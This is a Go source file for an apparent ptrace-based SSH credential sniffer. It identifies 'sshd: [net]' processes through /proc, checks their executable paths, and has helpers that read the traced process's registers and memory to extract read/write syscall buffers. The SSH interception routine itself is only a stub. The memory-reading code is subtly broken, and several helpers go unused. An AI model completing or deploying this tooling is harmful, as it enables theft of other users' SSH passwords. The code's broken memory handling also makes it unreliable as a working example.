package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
	"strings"
	"os/user"
	"strconv"
	"golang.org/x/sys/unix"
)

// Tracer function type
type tracerFunc func(pid int)

var tracers = []tracerFunc{
	nil,
	interceptSSH,
	nil,
}

var (
	processPID      int
	processName     string
	processPath     string
	processUsername string
)

var configValidPaths = []string{
	"/bin/",
	"/usr/local/bin/",
	"/usr/local/sbin/",
	"/usr/bin/",
	"/usr/sbin/",
}

// Constants for syscall arguments
const (
	RDI = iota
	RSI
	RDX
	R10
	R8
	R9
)

// Constants for tracers
const (
	InvalidTracer = iota
	SSHTracer
)

func getReg(child, off int) int {
	var regs unix.PtraceRegs
	err := unix.PtraceGetRegs(child, &regs)
	if err != nil {
		fmt.Println("Error reading register:", err)
		return -1
	}

	switch off {
	case RDI:
		return int(regs.Rdi)
	case RSI:
		return int(regs.Rsi)
	case RDX:
		return int(regs.Rdx)
	case R10:
		return int(regs.R10)
	case R8:
		return int(regs.R8)
	case R9:
		return int(regs.R9)
	default:
		return -1
	}
}

func waitSyscall(child int) bool {
	status := new(syscall.WaitStatus)
	for {
		err := syscall.PtraceSyscall(child, 0)
		if err != nil {
			fmt.Println("Error PtraceSyscall:", err)
			return false
		}

		pid, err := syscall.Wait4(child, status, syscall.WALL, nil)
		if err != nil {
			fmt.Println("Error waiting for child:", err)
			return false
		}

		if status.Stopped() && status.StopSignal()&syscall.SIGTRAP != 0 {
			return true
		}

		if status.Stopped() && status.StopSignal() == syscall.SIGUSR1 {
			continue
		}

		if status.Stopped() {
			syscall.Kill(pid, syscall.Signal(status.StopSignal()))
			return true
		}

		if status.Exited() {
			return true
		}
	}
}

func readMemory(child int, addr, length int) []byte {
	var val []byte
	var readSize int

	if length+int(unsafe.Sizeof(uintptr(0)))+1 < length {
		return nil
	}

	val = make([]byte, length+int(unsafe.Sizeof(uintptr(0)))+1)

	if val == nil {
		return nil
	}

	for readSize < length {
		tmp, err := syscall.PtracePeekData(child, uintptr(addr+readSize), val)
		if err != nil {
			fmt.Println("Error reading memory:", err)
			val[readSize] = 0
			break
		}

		readSize += int(unsafe.Sizeof(tmp))
	}

	return val
}

func extractReadString(tracedProcess int, length int) string {
	strPtr := getSyscallArg(tracedProcess, 1)
	strVal := readMemory(tracedProcess, strPtr, length)
	return string(strVal)
}

func extractWriteString(tracedProcess int, length int) string {
	strPtr := getSyscallArg(tracedProcess, 1)
	strVal := readMemory(tracedProcess, strPtr, length)
	return string(strVal)
}

func getSyscallArg(child, which int) int {
	switch which {
	case RDI:
		return getReg(child, RDI)
	case RSI:
		return getReg(child, RSI)
	case RDX:
		return getReg(child, RDX)
	case R10:
		return getReg(child, R10)
	case R8:
		return getReg(child, R8)
	case R9:
		return getReg(child, R9)
	default:
		return -1
	}
}

// Wrapper free functions to null out global variables when freed
func freeProcessName() {
	processName = ""
}

func freeProcessPath() {
	processPath = ""
}

func freeProcessUsername() {
	processUsername = ""
}

func validateProcessName() int {
	if processName == "" {
		return InvalidTracer
	}

	if len(processName) >= len("sshd: [net]") && processName[:len("sshd: [net]")] == "sshd: [net]" {
		return SSHTracer
	}

	return InvalidTracer
}

func validateProcessPath() bool {
	for _, configPath := range configValidPaths {
		if len(processPath) >= len(configPath) && processPath[:len(configPath)] == configPath {
			return true
		}
	}
	return false
}

func refreshProcessName(tracedProcess int) {
	processName = getProcName(tracedProcess)
}
func getSyscall(tracedProcess int) int {
	var regs unix.PtraceRegs
	err := unix.PtraceGetRegs(tracedProcess, &regs)
	if err != nil {
		fmt.Println("Error reading register:", err)
		return -1
	}
	return int(regs.Orig_rax)
}

func strnASCII(str string, length int) bool {
	for i := 0; i < length; i++ {
		if str[i] > 127 {
			return false
		}
	}
	return true
}

func traceProcess(tracedProcess int) {
	processName = getProcName(tracedProcess)
	processPath = getProcPath(tracedProcess)
	processPID = tracedProcess

	if processName == "" || processPath == "" {
		return
	}

	tracerType := validateProcessName()

	if processName == "" || tracerType == InvalidTracer || processPath == "" {
		return
	}

	if !validateProcessPath() {
		return
	}

	processUsername = getProcUsername(tracedProcess)

	if tracers[tracerType] != nil {
		tracers[tracerType](tracedProcess)
	}
}

// Add your tracer functions here, for example:
func interceptSSH(pid int) {
	// Your SSH tracer logic here
	fmt.Println("SSH Tracer called for PID:", pid)
}

func getProcName(pid int) string {
	cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
	data, err := os.ReadFile(cmdlinePath)
	if err != nil {
		fmt.Println("Error reading process name:", err)
		return ""
	}
	return string(data)
}

func getProcPath(pid int) string {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	path, err := os.Readlink(exePath)
	if err != nil {
		fmt.Println("Error reading process path:", err)
		return ""
	}
	return path
}

func getProcUsername(pid int) string {
	statPath := fmt.Sprintf("/proc/%d/status", pid)
	data, err := os.ReadFile(statPath)
	if err != nil {
		fmt.Println("Error reading process status:", err)
		return ""
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[0] == "Uid:" {
			uid, err := strconv.Atoi(fields[1])
			if err != nil {
				fmt.Println("Error converting UID to integer:", err)
				return ""
			}
			user, err := user.LookupId(strconv.Itoa(uid))
			if err != nil {
				fmt.Println("Error looking up username:", err)
				return ""
			}
			return user.Username
		}
	}
	return ""
}
